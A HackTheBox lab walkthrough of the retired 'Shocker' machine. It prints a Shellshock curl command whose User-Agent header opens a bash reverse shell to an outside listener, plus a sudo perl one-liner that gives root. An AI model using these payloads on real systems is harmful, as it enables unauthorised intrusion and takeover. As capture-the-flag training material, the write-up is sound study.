---
title: Shocker - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-06 12:00:00 
categories: [HackTheBox,Linux]
tags: [shellshock,sudo]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Shocker/00-banner.png
  width: 589
  height: 372
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Shocker` a retired machine by HackTheBox. Without further ado, let’s begin.

# Recon

## Nmap

As always, we'll start with a nmap scan to discover the open ports and services.

![01-nmap](/assets/img/HTB/Shocker/01-nmap.png)

The ports 80 and 2222 are open.

## Port 80

Let's see the web.

![02-webpage](/assets/img/HTB/Shocker/02-webpage.png)

The web page not give us much information, therefore, we’ll run gobuster to find any accessible directory.

![03-gobuster](/assets/img/HTB/Shocker/03-gobuster.png)

# Initial Foothold

We see in the screenshot above the `/cgi-bin/` directory, when I always see this directory comes to my mind the  `Shellshock` attack.
Running gobuster again to know the file and his extension.

![04-gobuster](/assets/img/HTB/Shocker/04-gobuster.png)

With a listening port and executing the command below, we can get a reverse shell.

```console
$ curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.31/443 0>&1" http://10.129.230.133/cgi-bin/user.sh
```

![05-shellshock](/assets/img/HTB/Shocker/05-shellshock.png)

# Privilage Escalation

As we see in the screenshot below,  we can execute `perl` like root without password.

```console
$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

![06-sudo](/assets/img/HTB/Shocker/06-sudo.png)

We are root!!!
That’s it for now guys. Until next time.
